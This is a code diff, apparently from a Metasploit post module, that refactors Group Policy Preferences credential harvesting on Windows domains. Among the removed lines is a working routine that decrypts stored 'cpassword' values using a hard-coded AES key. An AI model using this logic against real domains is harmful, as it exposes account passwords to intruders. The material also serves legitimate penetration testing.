@@ -6,8 +6,7 @@
 ##
 
 require 'msf/core'
-require 'rex'
-require 'rexml/document'
+require 'rex/parser/group_policy_preferences'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/priv'
 require 'msf/core/auxiliary/report'
@@ -217,35 +216,10 @@ class Metasploit3 < Msf::Post
 		mxml = xmlfile[:xml]
 		print_status "Parsing file: #{xmlfile[:path]} ..."
 		filetype = xmlfile[:path].split('\\').last()
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-			pass = decrypt(epassword)
 
-			user = node.attributes['runAs'] if node.attributes['runAs']
-			user = node.attributes['accountName'] if node.attributes['accountName']
-			user = node.attributes['username'] if node.attributes['username']
-			user = node.attributes['userName'] if node.attributes['userName']
-			user = node.attributes['newName'] unless node.attributes['newName'].blank?
-			changed = node.parent.attributes['changed']
+		results = Rex::Parser::GPP.parse(mxml)
 
-			# Printers and Shares
-			path = node.attributes['path']
-
-			# Datasources
-			dsn = node.attributes['dsn']
-			driver = node.attributes['driver']
-
-			# Tasks
-			app_name = node.attributes['appName']
-
-			# Services
-			service = node.attributes['serviceName']
-
-			# Groups
-			expires = node.attributes['expires']
-			never_expires = node.attributes['neverExpires']
-			disabled = node.attributes['acctDisabled']
+		results.each do |result|
 
 			table = Rex::Ui::Text::Table.new(
 				'Header'     => 'Group Policy Credential Info',
@@ -259,22 +233,24 @@ class Metasploit3 < Msf::Post
 			)
 
 			table << ["TYPE", filetype]
-			table << ["USERNAME", user]
-			table << ["PASSWORD", pass]
+			table << ["USERNAME", result[:USER]]
+			table << ["PASSWORD", result[:PASS]]
 			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
-			table << ["DOMAIN", xmlfile[:domain] ]
-			table << ["CHANGED", changed]
-			table << ["EXPIRES", expires] unless expires.blank?
-			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
-			table << ["DISABLED", disabled] unless disabled.blank?
-			table << ["PATH", path] unless path.blank?
-			table << ["DATASOURCE", dsn] unless dsn.blank?
-			table << ["DRIVER", driver] unless driver.blank?
-			table << ["TASK", app_name] unless app_name.blank?
-			table << ["SERVICE", service] unless service.blank?
+			table << ["DOMAIN", xmlfile[:domain]]
+			table << ["CHANGED", result[:CHANGED]]
+			table << ["EXPIRES", result[:EXPIRES]] unless result[:EXPIRES].blank?
+			table << ["NEVER_EXPIRES?", result[:NEVER_EXPIRE]] unless result[:NEVER_EXPIRE].blank?
+			table << ["DISABLED", result[:DISABLED]] unless result[:DISABLED].blank?
+			table << ["PATH", result[:PATH]] unless result[:PATH].blank?
+			table << ["DATASOURCE", result[:DSN]] unless result[:DSN].blank?
+			table << ["DRIVER", result[:DRIVER]] unless result[:DRIVER].blank?
+			table << ["TASK", result[:TASK]] unless result[:TASK].blank?
+			table << ["SERVICE", result[:SERVICE]] unless result[:SERVICE].blank?
 
-			node.elements.each('//Attributes//Attribute') do |dsn_attribute|
-				table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
+			unless result[:ATTRIBUTES].empty?
+				result[:ATTRIBUTES].each do |dsn_attribute|
+					table << ["ATTRIBUTE", "#{dsn_attribute[:A_NAME]} - #{dsn_attribute[:A_VALUE]}"]
+				end
 			end
 
 			print_good table.to_s
@@ -304,22 +280,6 @@ class Metasploit3 < Msf::Post
 			:source_type => "exploit",
 			:user => user,
 			:pass => pass)
-	end
-
-	def decrypt(encrypted_data)
-		padding = "=" * (4 - (encrypted_data.length % 4))
-		epassword = "#{encrypted_data}#{padding}"
-		decoded = Rex::Text.decode_base64(epassword)
-
-		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
-		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
-		aes.decrypt
-		aes.key = key
-		plaintext = aes.update(decoded)
-		plaintext << aes.final
-		pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
-
-		return pass
 	end
 
 	def enum_domains
